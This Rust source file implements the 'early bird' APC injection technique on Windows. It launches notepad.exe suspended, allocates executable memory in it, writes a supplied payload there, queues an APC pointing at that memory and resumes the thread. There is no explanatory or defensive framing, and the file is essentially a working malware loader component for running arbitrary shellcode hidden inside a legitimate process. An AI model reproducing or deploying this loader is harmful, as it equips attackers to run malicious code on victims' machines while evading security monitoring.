use std::{ffi::OsStr, os::windows::prelude::OsStrExt};

use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::{
    core::PWSTR,
    imp::GetLastError,
    Win32::{
        System::{
            Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
            Threading::{
                CreateProcessW, QueueUserAPC, ResumeThread, CREATE_SUSPENDED,
                PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOW,
            },
        },
    },
};

#[allow(dead_code)]
pub fn early_bird(payload: &[u8]) {
    let mut command_line = OsStr::new("notepad.exe")
        .encode_wide()
        .chain(Some(0)) // add NULL termination
        .collect::<Vec<_>>();
    let si = STARTUPINFOW::default();
    let mut pi = PROCESS_INFORMATION::default();

    let result = unsafe {
        CreateProcessW(
            None,
            PWSTR(command_line.as_mut_ptr()),
            None,
            None,
            false,
            PROCESS_CREATION_FLAGS(CREATE_SUSPENDED.0),
            None,
            None,
            &si,
            &mut pi,
        )
    };
    if result.as_bool() {
        println!("Process created: {}", pi.dwProcessId);
    } else {
        unsafe {
            eprintln!("Error: {}", GetLastError());
        }
        return;
    }
    let address = unsafe {
        VirtualAllocEx(
            pi.hProcess,
            None,
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if address.is_null() {
        unsafe {
            eprintln!("Error: {}", GetLastError());
        }
    } else {
        println!("Memory allocated at {:?}", address);
    }
    let mut bytes_written = 0;
    let result = unsafe {
        WriteProcessMemory(
            pi.hProcess,
            address,
            std::mem::transmute(payload.as_ptr()),
            payload.len(),
            Some(&mut bytes_written),
        )
    };
    if result.as_bool() {
        println!("Wrote {} bytes", bytes_written);
    } else {
        unsafe { eprintln!("Error: {}", GetLastError()); }
        return;
    }
    unsafe { QueueUserAPC(std::mem::transmute(address), pi.hThread, 0) };
    println!("QueueUserAPC called");
    unsafe { ResumeThread(pi.hThread) };
    println!("ResumeThread called");
}
